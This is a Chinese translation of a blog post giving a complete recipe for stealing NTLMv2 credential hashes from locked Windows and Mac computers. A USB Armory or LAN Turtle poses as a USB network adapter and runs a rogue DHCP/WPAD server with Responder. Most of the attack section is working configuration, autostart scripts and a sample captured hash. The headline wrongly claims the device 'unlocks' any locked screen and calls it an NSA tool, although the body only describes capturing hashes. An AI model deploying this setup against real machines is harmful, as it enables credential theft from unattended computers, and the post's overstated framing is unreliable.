> 原文链接: https://www.anquanke.com//post/id/84526 


# 使用恶意USB设备解锁任意锁屏状态Windows、Mac（含工具、视频演示）


                                阅读量   
                                **135895**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[https://room362.com/post/2016/snagging-creds-from-locked-machines/](https://room362.com/post/2016/snagging-creds-from-locked-machines/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01e06fdebf36e8ada1.jpg)](https://p1.ssl.qhimg.com/t01e06fdebf36e8ada1.jpg)



NSA专业物理入侵设备——USB Armory，可解锁任意锁屏状态的下的Windows和Mac操作系统，含最新发布的Windows10、及较早的Mac OSX El Capitan / Mavericks，想知道原理是什么？进来看看吧！



首先,这原本是没有可能实现的,但事实是我真的办到了(相信我,因为不敢相信这是真的,我已经测试了很多次。)

USB Ethernet + DHCP + Responder == 证书

**论题:**

**如果我在电脑上插入一个伪装成USB以太网适配器的设备, 那么即使这个系统是锁定的，我也可以从系统中获取证书。（也许还能做更多的事情,但这篇文章已经太长，我们会在之后另外讨论。)**

**<br>**

**1.设备的设置**

在文章一开始，我是用一个USB Armory (155美元)进行实验的，但在下文中，我也会向你们展示如何用Hak5 Turtle(49.99美元)实现这一目的。

我将会为你们提供设备本身的设置信息,下面还有一些可以为你们提供帮助的链接:

USB Armory

·Debian/Jessie – [https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card](https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card)

·Kali on USB Armory – [http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory](http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory)

·Resizing the SD partition – [http://base16.io/?p=61](http://base16.io/?p=61)

Hak5 Turtle

·Turtle video guides and wiki: [https://lanturtle.com/wiki/#!videos.md](https://lanturtle.com/wiki/#!videos.md)

**<br>**

**2.工具**

基本上，运用Laurent Gaffié的响应器可以完成捕获，所以你需要找到一个方法来将应答器映射到设备上，而Hak5 Turtle已经有这样的一个模块了:

[![](https://p1.ssl.qhimg.com/t01d09564424c04d468.png)](https://p1.ssl.qhimg.com/t01d09564424c04d468.png)

首次使用时，你必须将模块设置为“Enable”，随后它会自行下载所有相关项和软件包。

然后你还需要一个opkg update和opkg install python-openssl，这样应答器就可以正确运行了。

至于USB Armory，你可以使用SCP、网络连接共享、USB主机/客户端适配器:

[![](https://p1.ssl.qhimg.com/t01e06fdebf36e8ada1.jpg)](https://p1.ssl.qhimg.com/t01e06fdebf36e8ada1.jpg)

在Debian/Jessie的默认安装中没有安装Python，所以你必须解决所有的相关项(在Kali版本中不需要这个),并且需要互联网接入来执行以下内容:

```
apt-get install -y python git python-pip python-dev screen sqlite3
pip install pycrypto
git clone https://github.com/spiderlabs/responder
```

**<br>**

**3.配置**

Armory

首先,设置接口不是必需的，但是因为Armory的每个图像都有着不同的默认IP地址，设置它能够提高一致性, 因此它可以为下一步打下坚实的基础。

```
/etc/network/interfaces
　# interfaces(5) file used by ifup(8) and ifdown(8)
# Include files from /etc/network/interfaces.d:
source-directory /etc/network/interfaces.d
auto usb0
allow-hotplug usb0
iface usb0 inet static
  address 192.168.2.201
  netmask 255.255.255.0
  gateway 192.168.2.1
```

下面,我们来建立DHCP服务器:

```
/etc/dhcp/dhcpd.conf
ddns-update-style none;
option domain-name "domain.local";
option domain-name-servers 192.168.2.201;
default-lease-time 60;
max-lease-time 72;
# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;
# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;
# wpad
option local-proxy-config code 252 = text;
# A slightly different configuration for an internal subnet.
subnet 192.168.2.0 netmask 255.255.255.0 `{`
  range 192.168.2.1 192.168.2.2;
  option routers 192.168.2.201;
  option local-proxy-config "http://192.168.2.201/wpad.dat";
`}`
```

这里唯一的特殊配置是发送“Proxy Config” 选项到DHCP客户端。请注意这一行:

一篇关于WPAD的维基百科文章中提到：“DHCP的优先级高于DNS:如果DHCP提供了WPAD URL, DNS查找将不会执行。“

接下来,我们需要设置自动运行。我们编辑了rc.local文件,让它来做这样的几件事:

1.清理掉所有DHCP租约，并启动DHCP服务器。也许还存在着某种更好的方式,但是因为这台“计算机”被插入和取出得非常频繁,文件在某种程度上可能会损坏，因此我们只是移除并重新添加了它。

2.在一个屏幕会话中启动响应器。这样我们就可以得到屏幕会话的记录，作为Sqlite3数据库和应答器创建的日志文件的备份。

```
/etc/rc.local
#!/bin/sh -e
# Clear leases
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases
# Start DHCP server
/usr/sbin/dhcpd
# Start Responder
/usr/bin/screen -dmS responder bash -c 'cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F'
exit 0
```

为了让屏幕会话的日志记录启用(可以让你迅速找出问题),你需要添加一个a .screenrc文件。最重要的部分是:

```
/root/.screenrc
# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
```

就是这样,现在你应该可以重启USB Armory了,然后开始在任何可以插入USB的地方获取凭证。

Hak5 Turtle

现在，所有的事情几乎都已经完成了,唯一的区别在于opkg是你的软件包管理器:

```
opkg update
opkg install python-openssl screen
```

将符号链接移动到/ tmp /，这样日志会被保留下来

```
rm -rf /overlay/etc/turtle/Responder/logs
/overlay/etc/rc.local文件略有不同
/overlay/etc/rc.local
/etc/init.d/dnsmasq stop
/usr/sbin/screen -dmS responder bash -c 'cd /overlay/etc/turtle/Responder; python Responder.py -I br-lan -f -w -r -d -F'
```

**<br>**

**4.为什么它会奏效?**

1.因为USB是即插即用的，这就意味着,即使一个系统是锁着的, USB仍然可以被安装。我认为，在新的操作系统中(Win10 / El Capitan)，某些类型的设备可以在其锁定状态下进行安装时，是受到限制的,但是Ethernet/LAN肯定在白名单里。

2. 即使你没有打开任何浏览器或应用程序，电脑也仍在不断地创造流量, 出于某种原因，大多数计算机会信任它们的本地网络。

3.网络偏好通常基于Windows上的“metrics”和OSX上metrics和“preference”的结合,但在默认情况下，“wired”和“newer/faster”总能成为赢家。

这意味着, 由于有了应答器，插入设备后，它很快变成了网关、DNS服务器、WPAD服务器等部分。

从插入锁定的工作站到获取到证书，平均需要大约13秒的时间,这完全取决于系统的状况。另外，我使用了inotify来观察Responder.db数据库内文件的改变，并关闭Armory。它还能通过LED给我一个已经获取到了证书的指示。

为此，你需要安装inotify-tools包,并将以下内容添加到therc.local本地文件:

```
echo "Staring cred watch" &gt;&gt; /root/rc.log
/usr/bin/screen -dmS notify bash -c 'while inotifywait -e modify /root/responder/Responder.db; do shutdown -h now; done'
```

**5.最终结果:**

你在视频中能看到Windows 10的锁定屏幕。当LED发出指示时，Armory被完全关闭, 证书已经得到了！



观察结果:

```
root@wpad:~# sqlite3 /root/responder/Responder.db 'select * from responder'
2016-09-04 10:59:43|HTTP|NTLMv2|192.168.2.1||SITTINGDUCKmubix||5EAEA2859C397D8AE48CA87F:01010000000001E9D23F49F7891F38965D80A0010000000000000000000000000000000900260048005400540050002F007800780066006600730062006E0070006300000000000000....
```

步骤已完成。

在以下系统中测试成功:

**Windows 98 SE**

**Windows 2000 SP4**

**Windows XP SP3**

**Windows 7 SP1**

**Windows 10 (企业版和家庭版)**

**OSX El Capitan / Mavericks** (我可以在其中得到证书 ，但是我还在测试这是不是一个偶然情况)

我还没有在Linux上测试过, 如果成功了的话，我会另外写一篇文章。

**<br>**

**6.USB ARMORY与Hak5 LAN Turtle的比较**

1.Armory更具通用性，是一种不错的用于发动攻击的方式。具有更多的存储空间(SD)和更快的处理器。

2. 在SE攻击中，如果你试图插入一个设备，Hak5 LAN Turtle更容易完成任务。它可能不像Armory那样，在取得证书时有LED指示,但它有一个可以作为以太网端口的附加功能,因此你可以得到证书和一个shell。
